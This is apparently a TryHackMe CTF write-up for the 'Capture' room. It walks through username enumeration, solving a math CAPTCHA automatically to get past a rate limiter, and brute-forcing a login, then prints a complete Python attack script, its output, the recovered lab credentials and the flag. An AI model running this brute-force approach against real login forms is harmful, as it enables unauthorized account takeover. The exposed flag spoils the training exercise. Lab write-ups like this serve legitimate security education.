---
title: Capture - TryHackMe
date: 2025-02-04
---

<script setup>
    import RoomCard from "../../../../.vitepress/components/thm/RoomCard.vue";
</script>

<RoomCard
    roomName="Capture"
    roomIcon="/ctf/tryhackme/challenges/capture/icon-room.png"
    roomLink="https://tryhackme.com/room/capture"
    roomLevel="EASY"
    roomTechnology="Linux"
/>

## Challenge Overview

SecureSolaCoders has developed a **web application** featuring a login form.  
To prevent **brute-force attacks**, they implemented a **rate limiter** instead of a full-fledged **Web Application
Firewall (WAF)**.

We are given **two files**:

- `usernames.txt`
- `passwords.txt`

Our goal is to **bypass** the rate limiter and retrieve the **flag**.

## Exploring the Login Form

When attempting to log in with a random username and password, we receive an **error message**:

```text
The user 'username' does not exist
```

This suggests that the application **checks whether a username is valid before verifying the password**. This behavior
allows us to **enumerate valid usernames**.

## Automating the Attack

We automate the attack using a **Python script** to:

- **Enumerate valid usernames**
- **Bypass the rate limiter & CAPTCHA**
- **Brute-force the password**
- **Extract the flag**

### Step 1: Username Enumeration

Since the application explicitly states if a username exists, we can **loop through usernames** until we find a valid
one.

#### Key Observations:

- If a username is invalid, we get:
  ```text
  The user 'username' does not exist
  ```
- If a username is valid but the password is incorrect, we get:
  ```text
  Invalid password for user 'username'
  ```

Using this logic, we test usernames from `usernames.txt` until we find a valid one.

```python
def find_username():
    global lastresponse_text
    LOG.info("Starting username enumeration...", bold=True)
    
    for username in usernames:
        LOG.info(f"Trying username: {username}", remove_last_line=True)
        data = {"username": username, "password": "password"}

        response = make_request(data)
        if not response:
            continue

        if "Too many bad login attempts!" in response.text:
            data["captcha"] = resolve_captcha(lastresponse_text)
            response = make_request(data)

        if f"The user &#39;{username}&#39; does not exist" not in response.text:
            LOG.info(f"Valid username found: {username}", bold=True, remove_last_line=True)
            return username

    LOG.warning("No valid username found.")
    return None
```

### Step 2: Bypassing the Rate Limiter & CAPTCHA

If too many incorrect attempts are made, the application **triggers a CAPTCHA**:

```
Too many bad login attempts!
```

The CAPTCHA is a simple **math expression**, e.g.:

```
Solve: 23 + 9 = ?
```

We use **Regex** to extract and solve the CAPTCHA automatically.

```python
def resolve_captcha(text):
    try:
        r = re.findall(r"(\d+)\s*([+\-*/])\s*(\d+)\s*=\s*\?", text)[0]
        num1, sign, num2 = int(r[0]), r[1], int(r[2])
        return eval(f"{num1}{sign}{num2}")
    except (IndexError, ValueError) as e:
        LOG.error(f"Failed to resolve captcha: {e}")
        return None
```

### Step 3: Password Brute-force

Once a **valid username** is found, we loop through `passwords.txt` to find the correct password.

```python
def find_password(username):
    global lastresponse_text
    LOG.info(f"Starting password brute-force for username: {username}", bold=True)
    
    for password in passwords:
        LOG.info(f"Trying password: {password}", remove_last_line=True)
        data = {"username": username, "password": password}

        response = make_request(data)
        if not response:
            continue

        if "Too many bad login attempts!" in response.text:
            data["captcha"] = resolve_captcha(lastresponse_text)
            response = make_request(data)

        if "Invalid password for user" not in response.text:
            LOG.info(f"Valid password found: {password}", bold=True, remove_last_line=True)
            return password

    LOG.warning("No valid password found.")
    return None
```

### Step 4: Extracting the Flag

Once logged in successfully, the flag is displayed in the HTML response.  
We use **Regex** to extract it:

```python
flag = re.findall(r"Flag.txt:</h2>\s*<h3>(\w+)</h3>", lastresponse_text)

if flag:
    LOG.info(f"Flag found: {flag[0]}", bold=True)
else:
    LOG.error("Flag not found.", bold=True)
```

## Full Python Script

```python
import re
import sys
import time
import requests


# Custom Logging Class
class Log:
    def __init__(self):
        self.GREEN = "\033[32m"
        self.WHITE = "\033[39m"
        self.CYAN = "\033[36m"
        self.BG_RED = "\033[41m"
        self.DEFAULT_BG = "\033[49m"
        self.RESET = "\033[0m"
        self.BOLD = "\033[1m"

    def error(self, message, bold=False, remove_last_line=False):
        if remove_last_line:
            self.remove_last_line()
        print(self.format_message("ERROR", self.BG_RED, message, bold))

    def info(self, message, bold=False, remove_last_line=False):
        if remove_last_line:
            self.remove_last_line()
        print(self.format_message("INFO", self.GREEN, message, bold))

    def warning(self, message, bold=False, remove_last_line=False):
        if remove_last_line:
            self.remove_last_line()
        print(self.format_message("WARNING", self.CYAN, message, bold))

    def format_message(self, level, color, message, bold):
        bold_format = self.BOLD if bold else ""
        return f"{self.get_time()} {bold_format}{color}{level}{self.WHITE}{self.DEFAULT_BG} {message}{self.RESET}"

    def get_time(self):
        return f"[{self.CYAN}{time.strftime('%H:%M:%S')}{self.WHITE}]"

    def remove_last_line(self):
        sys.stdout.write("\033[F")
        sys.stdout.write("\033[K")


LOG = Log()

# Target URL
url = "http://10.10.41.198/login"

# Load usernames and passwords
usernames_path = "usernames.txt"
passwords_path = "passwords.txt"

try:
    with open(usernames_path, "r") as file:
        usernames = file.read().splitlines()
    with open(passwords_path, "r") as file:
        passwords = file.read().splitlines()
except FileNotFoundError as e:
    LOG.error(f"Error loading file: {e}", bold=True)
    sys.exit(1)

lastresponse_text = ""


# Function to make a POST request
def make_request(data):
    global lastresponse_text
    try:
        response = requests.post(url, data=data, timeout=5)
        lastresponse_text = response.text
        return response
    except requests.RequestException as e:
        LOG.error(f"Request failed: {e}")
        return None


# Function to resolve captcha
def resolve_captcha(text):
    try:
        r = re.findall(r"(\d+)\s*([+\-*/])\s*(\d+)\s*=\s*\?", text)[0]
        num1, sign, num2 = int(r[0]), r[1], int(r[2])
        return eval(f"{num1}{sign}{num2}")
    except (IndexError, ValueError) as e:
        LOG.error(f"Failed to resolve captcha: {e}")
        return None


# Function to find a valid username
def find_username():
    global lastresponse_text
    LOG.info("Starting username enumeration...", bold=True)
    LOG.info("")

    for idx, username in enumerate(usernames):
        LOG.info(f"Trying username: {username}", remove_last_line=True)
        data = {"username": username, "password": "password"}

        response = make_request(data)
        if not response:
            continue

        if "Too many bad login attempts!" in response.text:
            data["captcha"] = resolve_captcha(lastresponse_text)
            response = make_request(data)

        if f"The user &#39;{username}&#39; does not exist" not in response.text:
            LOG.info(f"Valid username found: {username}", bold=True, remove_last_line=True)
            return username

    LOG.warning("No valid username found.")
    return None


# Function to find a valid password for the given username
def find_password(username):
    global lastresponse_text
    LOG.info(f"Starting password brute-force for username: {username}", bold=True)
    LOG.info("")

    for idx, password in enumerate(passwords):
        LOG.info(f"Trying password ({idx + 1}/{len(passwords)}): {password} ", remove_last_line=True)
        data = {"username": username, "password": password}

        response = make_request(data)
        if not response:
            continue

        if "Too many bad login attempts!" in response.text:
            data["captcha"] = resolve_captcha(lastresponse_text)
            response = make_request(data)

        if "Invalid password for user" not in response.text:
            LOG.info(f"Valid password found: {password}", bold=True, remove_last_line=True)
            return password

    LOG.warning("No valid password found.")
    return None


if __name__ == "__main__":
    LOG.info("Initializing script", bold=True)
    username = find_username()
    if username:
        password = find_password(username)
        if password:
            LOG.info(f"Login successful! Username: {username}, Password: {password}", bold=True)
            flag = re.findall(r"Flag.txt:</h2>\s*<h3>(\w+)</h3>", lastresponse_text)
            if flag:
                LOG.info(f"Flag found: {flag[0]}", bold=True)
            else:
                LOG.error("Flag not found.", bold=True)
        else:
            LOG.error("Password not found.", bold=True)
    else:
        LOG.error("Username not found.", bold=True)
```

## Running the Script

Run the script:

```bash
python3 exploit.py
```

Results:

```bash
[22:23:57] INFO Initializing script
[22:23:57] INFO Starting username enumeration...
[22:24:34] INFO Valid username found: natalie
[22:24:34] INFO Starting password brute-force for username: natalie
[22:25:16] INFO Valid password found: sk8board
[22:25:16] INFO Login successful! Username: natalie, Password: sk8board
[22:25:16] INFO Flag found: 7df2eabce36f02ca8ed7f237f77ea416
```

The script successfully **bypassed the rate limiter**, **brute-forced the password**, and **extracted the flag**.
